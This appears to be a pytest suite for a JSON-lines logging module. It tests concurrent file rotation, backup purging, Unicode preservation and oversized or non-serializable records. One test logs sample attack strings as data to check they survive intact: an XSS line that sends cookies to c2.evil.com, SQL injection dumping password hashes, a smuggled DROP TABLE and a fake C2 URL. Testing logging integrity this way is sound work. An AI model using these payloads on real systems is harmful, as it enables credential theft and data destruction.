"""Adversarial empirical stress testing suite for Requirement R1 (Logging Architecture).

Authored by Challenger L1_1 to rigorously challenge:
1. Multi-threaded rapid rollover with small maxBytes and backupCount=5 under Windows concurrency.
2. Prevention of Windows [WinError 32] / PermissionError file locking conflicts during rotation.
3. Strict enforcement of backupCount file purging (never exceeding max backups, .1 to .5 only).
4. Complete 100% valid JSON Lines parsing across base file and all rotated backup files.
5. Verbatim UTF-8 preservation of non-ASCII, Cyrillic, Asian, Arabic, Hebrew, Emoji, and Threat Intel payloads.
6. Graceful handling of oversized messages (exceeding maxBytes) and non-serializable extra attributes.
"""

from __future__ import annotations

import concurrent.futures
import json
import tempfile
from pathlib import Path
from typing import TYPE_CHECKING, Any

import pytest

from src.utils.logging_config import (
    get_logger,
    reset_logging_handlers,
    setup_logging,
)

if TYPE_CHECKING:
    from _pytest.capture import CaptureFixture
    from _pytest.fixtures import FixtureRequest
    from _pytest.logging import LogCaptureFixture
    from _pytest.monkeypatch import MonkeyPatch
    from pytest_mock.plugin import MockerFixture


def _type_check_fixtures(
    _c: CaptureFixture[str] | None = None,
    _r: FixtureRequest | None = None,
    _l: LogCaptureFixture | None = None,
    _m: MonkeyPatch | None = None,
    _mock: MockerFixture | None = None,
) -> None:
    """Type checking helper to validate test framework fixture typing contracts."""


@pytest.fixture(autouse=True)
def _cleanup_logging() -> Any:
    """Ensure logging handlers are cleanly reset before and after every test."""
    reset_logging_handlers()
    yield
    reset_logging_handlers()


def test_concurrent_multithreaded_rollover_and_backup_count() -> None:
    """
    Stress-test concurrent multi-threaded writes with small maxBytes and backupCount=5.

    Asserts:
    1. Zero Windows file lock [WinError 32] or PermissionError exceptions across all worker threads.
    2. Primary log and rotated backup files (.1 through .5) are created.
    3. Older rotated files beyond backupCount are purged (never exceeding .5; .6 must not exist).
    4. 100% of all lines in primary and all backup files parse strictly as valid single-line JSON.
    5. Standard schema keys (timestamp ending with 'Z', level, logger, message) exist in every line.
    """
    with tempfile.TemporaryDirectory() as td:
        log_file = Path(td) / "stress_vx_rag.jsonl"
        max_bytes = 1024  # 1 KB threshold to trigger aggressive rotation
        backup_count = 5
        num_threads = 10
        messages_per_thread = 100  # Total 1,000 log records

        setup_logging(
            log_file=str(log_file),
            max_bytes=max_bytes,
            backup_count=backup_count,
            log_level="INFO",
            log_format="json",
        )

        thread_errors: list[Exception] = []
        loggers = [get_logger(f"stress_worker_{tid}") for tid in range(num_threads)]

        def worker_task(thread_id: int) -> int:
            written = 0
            try:
                logger = loggers[thread_id]
                for seq in range(messages_per_thread):
                    logger.info(
                        f"Concurrent stress message from worker {thread_id:02d} seq {seq:03d}",
                        thread_id=thread_id,
                        seq=seq,
                        batch_tag="adversarial_stress_r1",
                    )
                    written += 1
            except (OSError, RuntimeError, ValueError) as exc:
                thread_errors.append(exc)
            return written

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(worker_task, tid) for tid in range(num_threads)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        # Assert 1: Zero thread-level exceptions or file lock errors
        assert not thread_errors, f"Encountered thread exceptions: {thread_errors}"
        assert sum(results) == num_threads * messages_per_thread

        # Find all generated log files in td
        parent_dir = log_file.parent
        all_log_files = sorted(
            parent_dir.glob(f"{log_file.name}*"),
            key=lambda p: p.name,
        )

        # Assert 2 & 3: File rotation and backup count purging
        assert log_file.exists(), "Primary log file must exist."
        # Total files must never exceed primary + backup_count (1 + 5 = 6)
        assert len(all_log_files) <= backup_count + 1, (
            f"Log file count {len(all_log_files)} exceeded maximum allowed {backup_count + 1}: "
            f"{[f.name for f in all_log_files]}"
        )

        # Check for purge enforcement: .6, .7, etc. must NEVER exist
        excess_backups = list(parent_dir.glob(f"{log_file.name}.[6-9]*"))
        assert not excess_backups, f"Found excess backup files that were not purged: {excess_backups}"

        # Verify backups .1 through .5 were created given the volume (~100 KB total data vs 1 KB max_bytes)
        for i in range(1, backup_count + 1):
            backup_path = parent_dir / f"{log_file.name}.{i}"
            assert backup_path.exists(), f"Expected rotated backup file {backup_path.name} to exist."

        # Flush and release handlers before disk verification
        reset_logging_handlers()

        # Assert 4 & 5: Validate JSON validity and schema on 100% of lines across all files
        total_lines_validated = 0
        for file_path in all_log_files:
            content = file_path.read_text(encoding="utf-8")
            lines = [line.strip() for line in content.splitlines() if line.strip()]
            for line_num, line in enumerate(lines, start=1):
                try:
                    record = json.loads(line)
                except json.JSONDecodeError as err:
                    pytest.fail(
                        f"Corrupted JSON in file {file_path.name} at line {line_num}: {err}\nContent: {line!r}"
                    )

                assert isinstance(record, dict)
                assert "timestamp" in record, f"Missing timestamp in {file_path.name}:{line_num}"
                assert record["timestamp"].endswith("Z"), f"Timestamp not UTC 'Z': {record['timestamp']}"
                assert "level" in record, f"Missing level in {file_path.name}:{line_num}"
                assert "logger" in record, f"Missing logger in {file_path.name}:{line_num}"
                assert "message" in record, f"Missing message in {file_path.name}:{line_num}"
                total_lines_validated += 1

        assert total_lines_validated > 0, "At least one log line must have been validated."


def test_concurrent_multi_logger_shared_handler() -> None:
    """
    Verify that concurrent writes across distinct loggers share the RotatingFileHandler.

    Ensures that when 8 separate loggers write simultaneously to the same log path,
    all log records are safely serialized by the handler lock without race conditions.
    """
    with tempfile.TemporaryDirectory() as td:
        log_file = Path(td) / "shared_multi_logger.jsonl"
        max_bytes = 800
        backup_count = 8
        num_loggers = 8
        entries_per_logger = 3

        setup_logging(
            log_file=str(log_file),
            max_bytes=max_bytes,
            backup_count=backup_count,
            log_level="DEBUG",
            log_format="json",
        )

        loggers = [get_logger(f"tenant_{i}") for i in range(num_loggers)]

        def write_from_named_logger(logger_id: int) -> None:
            logger = loggers[logger_id]
            for idx in range(entries_per_logger):
                logger.debug(
                    f"Multi-logger telemetry message idx={idx} from tenant={logger_id}",
                    tenant_id=logger_id,
                    index=idx,
                )

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_loggers) as pool:
            futures = [pool.submit(write_from_named_logger, i) for i in range(num_loggers)]
            for f in concurrent.futures.as_completed(futures):
                f.result()

        reset_logging_handlers()

        # Verify all generated files are valid JSON Lines
        all_files = sorted(Path(td).glob(f"{log_file.name}*"))
        assert len(all_files) >= 2, "Expected rotation into at least 1 backup file."

        tenants_found: set[int] = set()
        for file_path in all_files:
            for line in file_path.read_text(encoding="utf-8").splitlines():
                if line.strip():
                    data = json.loads(line)
                    assert "message" in data
                    if "tenant_id" in data:
                        tenants_found.add(data["tenant_id"])

        # All tenants must have successfully written entries
        assert tenants_found == set(range(num_loggers)), (
            f"Missing tenant records: {set(range(num_loggers)) - tenants_found}"
        )


def test_unicode_and_threat_intel_payload_integrity() -> None:
    """
    Adversarially test non-ASCII, Unicode scripts, Emoji, and Threat Intel payloads.

    Verifies:
    1. Perfect UTF-8 preservation of Ukrainian, Asian, Arabic, Hebrew, and Emoji characters.
    2. Safe handling of cybersecurity injection payloads (XSS, SQLi, command injection).
    3. Threat intelligence indicators (IPv4, IPv6, hashes, domains, C2 URLs) preserved intact.
    4. Zero replacement characters (\\ufffd) and 100% valid JSON parsing.
    """
    with tempfile.TemporaryDirectory() as td:
        log_file = Path(td) / "unicode_threat_intel.jsonl"
        backup_count = 5
        setup_logging(
            log_file=str(log_file),
            max_bytes=2048,
            backup_count=backup_count,
            log_level="INFO",
            log_format="json",
        )
        logger = get_logger("adversarial_unicode_tester")

        test_payloads: list[dict[str, Any]] = [
            {
                "category": "ukrainian_cyrillic",
                "message": "Перевірка стійкості ротації логів: Український текст із спеціальними символами: ґ, ї, є, і. Слава Україні!",
                "extras": {"lang": "uk", "alphabet": "кирилиця", "city": "Київ"},
            },
            {
                "category": "japanese_cjk",
                "message": "日本語のログテスト: 高度持続的脅威 (APT) 攻撃検出アラート",
                "extras": {"threat_level": "極めて高い", "region": "東京"},
            },
            {
                "category": "chinese_cjk",
                "message": "网络安全威胁情报分析：检测到恶意软件后门与凭据转储攻击",
                "extras": {"classification": "高危", "vector": "钓鱼邮件"},
            },
            {
                "category": "arabic_rtl",
                "message": "اختبار تسجيل الدخول باللغة العربية: تم اكتشاف هجوم إلكتروني مشبوه",
                "extras": {"direction": "rtl", "alert": "تحذير"},
            },
            {
                "category": "hebrew_rtl",
                "message": "בדיקת רישום יומן עברית: זוהתה פעילות זדונית ברשת",
                "extras": {"source": "ישראל", "severity": "חמור"},
            },
            {
                "category": "emoji_rich",
                "message": "🚨 INCIDENT #9921: 💀 Ransomware 🦠 detected! 💥 Payload detonated 🛡️ SOC engaged 🔒 Assets isolated ✅",
                "extras": {"badges": ["🔥", "⚡", "🎯"], "status": "resolved ✨"},
            },
            {
                "category": "xss_injection",
                "message": "<script>fetch('https://c2.evil.com/beacon?cookie='+document.cookie)</script><img src=x onerror=alert(1)>",
                "extras": {"payload_type": "DOM_XSS", "target_param": "<svg/onload=alert('pwned')>"},
            },
            {
                "category": "sqli_injection",
                "message": "admin' UNION ALL SELECT null, username, password_hash, token FROM users WHERE '1'='1' --",
                "extras": {"syntax": "UNION_BASED_SQLI", "table": "users; DROP TABLE sessions; --"},
            },
            {
                "category": "special_escapes_and_newlines",
                "message": "Line1\nLine2\r\nLine3\tTabbed\\Backslash\"DoubleQuote\"'SingleQuote'/ForwardSlash",
                "extras": {"raw_newlines": "Multi\nLine\nData", "quotes": "He said: \"Hello\""},
            },
            {
                "category": "threat_intel_indicators",
                "message": "Threat actor APT29 leveraged suspicious beaconing to external infrastructure",
                "extras": {
                    "ipv4": "198.51.100.42",
                    "ipv6": "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
                    "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                    "md5": "d41d8cd98f00b204e9800998ecf8427e",
                    "c2_url": "https://malicious-c2-beacon.test:8443/api/v1/gate.php?id=bot_01",
                    "mitre_id": "T1059.001",
                },
            },
        ]

        # Write each payload 10 times to ensure multiple rotation cycles
        for repeat in range(10):
            for item in test_payloads:
                logger.info(
                    f"[{repeat}] {item['message']}",
                    category=item["category"],
                    **item["extras"],
                )

        reset_logging_handlers()

        all_files = sorted(Path(td).glob(f"{log_file.name}*"))
        assert len(all_files) >= 2, "Expected multiple files from rotation."

        validated_payload_count = 0
        for fpath in all_files:
            content = fpath.read_text(encoding="utf-8")
            assert "\ufffd" not in content, f"Replacement character detected in {fpath.name}"

            for line in content.splitlines():
                if not line.strip():
                    continue
                entry = json.loads(line)
                validated_payload_count += 1

                # Assert Ukrainian Cyrillic characters preserved without corruption
                if entry.get("category") == "ukrainian_cyrillic":
                    assert "ґ, ї, є, і" in entry["message"]
                    assert entry.get("alphabet") == "кирилиця"
                    assert entry.get("city") == "Київ"

                # Assert Japanese characters preserved
                if entry.get("category") == "japanese_cjk":
                    assert "日本語のログテスト" in entry["message"]
                    assert entry.get("threat_level") == "極めて高い"

                # Assert Emoji preserved
                if entry.get("category") == "emoji_rich":
                    assert "🚨 INCIDENT" in entry["message"]
                    assert "💀" in entry["message"]
                    assert entry.get("status") == "resolved ✨"

                # Assert Threat Intel indicators preserved
                if entry.get("category") == "threat_intel_indicators":
                    assert entry.get("ipv4") == "198.51.100.42"
                    assert entry.get("sha256") == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                    assert entry.get("mitre_id") == "T1059.001"

        # Verify rotation purged older files and kept exactly backup_count + 1 files
        assert len(all_files) == backup_count + 1, f"Expected {backup_count + 1} files, got {len(all_files)}"
        assert validated_payload_count > 0, "Expected surviving payload records to be validated"


def test_oversized_record_exceeding_max_bytes() -> None:
    """
    Test logging a single record whose size strictly exceeds maxBytes.

    Verifies:
    1. Single oversized record is written without crash or truncation.
    2. Subsequent write triggers rollover cleanly.
    3. Both the oversized record and following records parse as valid JSON.
    """
    with tempfile.TemporaryDirectory() as td:
        log_file = Path(td) / "oversized.jsonl"
        max_bytes = 500  # Smaller than message
        setup_logging(
            log_file=str(log_file),
            max_bytes=max_bytes,
            backup_count=3,
            log_level="INFO",
            log_format="json",
        )
        logger = get_logger("oversized_tester")

        huge_payload = "A" * 3500  # 3.5 KB message (> 500 bytes threshold)
        logger.info(f"Oversized message: {huge_payload}", payload_length=len(huge_payload))

        # Log subsequent small records
        for i in range(5):
            logger.info(f"Subsequent record #{i} after oversized write")

        reset_logging_handlers()

        all_files = sorted(Path(td).glob(f"{log_file.name}*"))
        assert len(all_files) >= 2, "Expected rollover after oversized record write."

        # Validate that every line in every file parses cleanly
        found_oversized = False
        for fpath in all_files:
            for line in fpath.read_text(encoding="utf-8").splitlines():
                if line.strip():
                    record = json.loads(line)
                    if record.get("payload_length") == 3500:
                        found_oversized = True
                        assert huge_payload in record["message"]

        assert found_oversized, "The oversized message must be found and intact in the log files."


def test_non_serializable_extras_graceful_handling() -> None:
    """
    Verify that non-JSON-serializable objects in extra do not crash the logger.

    Tests sets, custom class instances, and unhandled objects in record.__dict__.
    """
    with tempfile.TemporaryDirectory() as td:
        log_file = Path(td) / "non_serializable.jsonl"
        setup_logging(
            log_file=str(log_file),
            max_bytes=10000,
            backup_count=2,
            log_level="INFO",
            log_format="json",
        )
        logger = get_logger("fallback_tester")

        class UnserializableObject:
            def __repr__(self) -> str:
                return "<CustomUnserializableObject id=0xDEADBEEF>"

        # Passing set, lambda, and custom object in extra kwargs
        logger.info(
            "Testing non-serializable extras fallback",
            tag_set={"alpha", "beta", "gamma"},
            custom_ref=UnserializableObject(),
        )

        reset_logging_handlers()

        content = log_file.read_text(encoding="utf-8").strip()
        data = json.loads(content)
        assert data["message"] == "Testing non-serializable extras fallback"
        assert "<CustomUnserializableObject" in data["custom_ref"]
        assert "tag_set" in data


def test_rapid_reset_and_reconfiguration() -> None:
    """
    Verify rapid cycles of setup_logging, logging, and reset_logging_handlers.

    Ensures file descriptors are properly closed on Windows without lingering locks.
    """
    with tempfile.TemporaryDirectory() as td:
        log_file_1 = Path(td) / "lifecycle_1.jsonl"
        log_file_2 = Path(td) / "lifecycle_2.jsonl"

        for cycle in range(5):
            # Configure file 1
            setup_logging(log_file=str(log_file_1), max_bytes=1000, backup_count=2)
            l1 = get_logger(f"cycle_{cycle}_logger_1")
            l1.info(f"Cycle {cycle} message to file 1")
            reset_logging_handlers()

            # Configure file 2
            setup_logging(log_file=str(log_file_2), max_bytes=1000, backup_count=2)
            l2 = get_logger(f"cycle_{cycle}_logger_2")
            l2.info(f"Cycle {cycle} message to file 2")
            reset_logging_handlers()

        assert log_file_1.exists()
        assert log_file_2.exists()
        assert len(log_file_1.read_text(encoding="utf-8").splitlines()) >= 5
        assert len(log_file_2.read_text(encoding="utf-8").splitlines()) >= 5
